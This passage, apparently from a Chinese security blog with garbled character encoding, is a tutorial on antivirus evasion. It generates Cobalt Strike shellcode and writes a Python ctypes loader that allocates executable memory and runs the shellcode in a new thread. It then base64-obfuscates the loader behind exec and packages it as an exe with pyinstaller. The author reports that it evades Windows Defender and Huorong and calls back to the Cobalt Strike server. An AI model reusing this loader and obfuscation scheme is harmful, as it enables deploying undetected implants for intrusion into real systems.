&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kernel32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WaitForSingleObject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;handle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;0x02-å®æˆ˜&#34;&gt;0x02 å®æˆ˜&lt;/h1&gt;
&lt;p&gt;è¿™é‡Œå°±ç›´æ¥å®æˆ˜è¿‡å…æ€çš„æ•´ä¸ªè¿‡ç¨‹ï¼Œä¸»è¦çš„æ€è·¯å°±æ˜¯shellcodeå’Œloaderç¼–ç æ··æ·†ï¼ŒæŠŠpythonè½¬æˆexeå¯æ‰§è¡Œæ–‡ä»¶ã€‚&lt;/p&gt;
&lt;h2 id=&#34;1ç”Ÿæˆshellcode&#34;&gt;1ã€ç”Ÿæˆshellcode&lt;/h2&gt;
&lt;p&gt;æˆ‘ä»¬æ¥ä½¿ç”¨CSç”Ÿæˆçš„shellcodeï¼Œé€‰æ‹©ä¸‹é¢çš„é€‰é¡¹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/python_separation_to_antivirus/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;é€‰æ‹©ä½ çš„ç›‘å¬ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/python_separation_to_antivirus/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¾“å‡ºé€‰æ‹©Pythonï¼Œé€‰å…¶ä»–ä¹Ÿå¯ä»¥ï¼Œæˆ‘ä»¬åªæ˜¯è¦é‡Œé¢çš„åå…­è¿›åˆ¶shellcodeå°±è¡Œï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/python_separation_to_antivirus/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç‚¹å‡»åä¼šåœ¨ç”¨æˆ·çš„ç›®å½•ç”Ÿæˆä¸€ä¸ªpayload.pyçš„æ–‡ä»¶ï¼Œé‡Œé¢è¿™ä¸€ä¸²16è¿›åˆ¶å°±æ˜¯æ‰€è°“çš„shellcodeäº†ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬éœ€è¦æŠŠshellcodeè¿›è¡Œä¸€äº›å¤„ç†ï¼ŒæŠŠåŸæœ‰shellcodeçš„&lt;code&gt;\x&lt;/code&gt;å»æ‰ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/python_separation_to_antivirus/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åè¿›è¡Œbase64ç¼–ç ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/python_separation_to_antivirus/6.png&#34; alt=&#34;6&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;2ç¼–å†™loaderä»£ç &#34;&gt;2ã€ç¼–å†™Loaderä»£ç &lt;/h2&gt;
&lt;p&gt;åœ¨è¿™é‡Œæ¨èä½¿ç”¨çš„ä¸€å¥—loaderï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;ctypes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;base64&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;shellcodeçš„base64ç¼–ç &amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;base64&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b64decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;bytes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fromhex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kernel32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;VirtualAlloc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;restype&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_uint64&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;rwxpage&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kernel32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;VirtualAlloc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x1000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x40&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kernel32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;RtlMoveMemory&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_uint64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rwxpage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;create_string_buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;handle&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kernel32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CreateThread&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_uint64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rwxpage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kernel32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WaitForSingleObject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;handle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™é‡Œæ‰§è¡Œå¯ä»¥æ­£å¸¸ä¸Šçº¿ï¼Œä¹Ÿå¯ä»¥è¿‡å¾®è½¯çš„defenderï¼Œä½†æ˜¯ä¼šè¢«ç«ç»’ç§’æ€ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å¯ä»¥æŠŠloaderéƒ¨åˆ†è¿›è¡Œç¼–ç ï¼ŒæŠŠä¸‹é¢çš„ä»£ç è¿›è¡Œbase64ç¼–ç ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kernel32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;VirtualAlloc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;restype&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_uint64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rwxpage&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kernel32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;VirtualAlloc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x1000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x40&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kernel32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;RtlMoveMemory&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_uint64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rwxpage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;create_string_buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;handle&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kernel32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CreateThread&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_uint64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rwxpage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kernel32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WaitForSingleObject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;handle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/python_separation_to_antivirus/7.png&#34; alt=&#34;7&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¾—åˆ°æœ€ç»ˆçš„Pythonä»£ç ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;ctypes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;base64&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;shellcodeçš„base64ç¼–ç &amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;base64&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b64decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;bytes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fromhex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;loader&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MucmVzdHlwZT1jdHlwZXMuY191aW50NjQ7cnd4cGFnZSA9IGN0eXBlcy53aW5kbGwua2VybmVsMzIuVmlydHVhbEFsbG9jKDAsIGxlbihzaGVsbGNvZGUpLCAweDEwMDAsIDB4NDApO2N0eXBlcy53aW5kbGwua2VybmVsMzIuUnRsTW92ZU1lbW9yeShjdHlwZXMuY191aW50NjQocnd4cGFnZSksIGN0eXBlcy5jcmVhdGVfc3RyaW5nX2J1ZmZlcihzaGVsbGNvZGUpLCBsZW4oc2hlbGxjb2RlKSk7aGFuZGxlID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoMCwgMCwgY3R5cGVzLmNfdWludDY0KHJ3eHBhZ2UpLCAwLCAwLCAwKTtjdHlwZXMud2luZGxsLmtlcm5lbDMyLldhaXRGb3JTaW5nbGVPYmplY3QoaGFuZGxlLCAtMSk=&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;exec&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;base64&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b64decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;loader&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3pythonè½¬exe&#34;&gt;3ã€Pythonè½¬Exe&lt;/h2&gt;
&lt;p&gt;æˆ‘ä»¬éœ€è¦å®‰è£…ä¸€ä¸ªpyinstalleræ¨¡å—ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python -m pip install pyinstaller==3.0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python -m pip install pypiwin32
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚æœç½‘é€Ÿå¤ªæ…¢çš„è¯å°±ç”¨å›½å†…çš„é•œåƒï¼Œåé¢åŠ å‡ ä¸ªå‘½ä»¤ï¼Œä¾‹å¦‚ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python -m pip install pypiwin32 -i http://mirrors.aliyun.com/pypi/simple/  --trusted-host mirrors.aliyun.com
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤è¿›è¡Œæ‰“åŒ…ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pyinstaller -F exp.py
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ‰“åŒ…å®Œæˆåä¼šåœ¨distç›®å½•ç”Ÿæˆexeæ–‡ä»¶ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/python_separation_to_antivirus/8.png&#34; alt=&#34;8&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;4æµ‹è¯•å…æ€æ•ˆæœ&#34;&gt;4ã€æµ‹è¯•å…æ€æ•ˆæœ&lt;/h2&gt;
&lt;p&gt;å¾®è½¯çš„defenderæ²¡å•¥é—®é¢˜ï¼Œç«ç»’ä¹Ÿæ­£å¸¸ä¸Šçº¿ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/python_separation_to_antivirus/9.png&#34; alt=&#34;9&#34;&gt;&lt;/p&gt;
&lt;p&gt;CSä¸Šçº¿ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/python_separation_to_antivirus/10.png&#34; alt=&#34;10&#34;&gt;&lt;/p&gt;
&lt;p&gt;æŸ¥æ€ç‡è¿˜æ˜¯ä¸é”™çš„ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/python_separation_to_antivirus/11.png&#34; alt=&#34;10&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;0x03-å‚è€ƒ&#34;&gt;0x03 å‚è€ƒ&lt;/h1&gt;
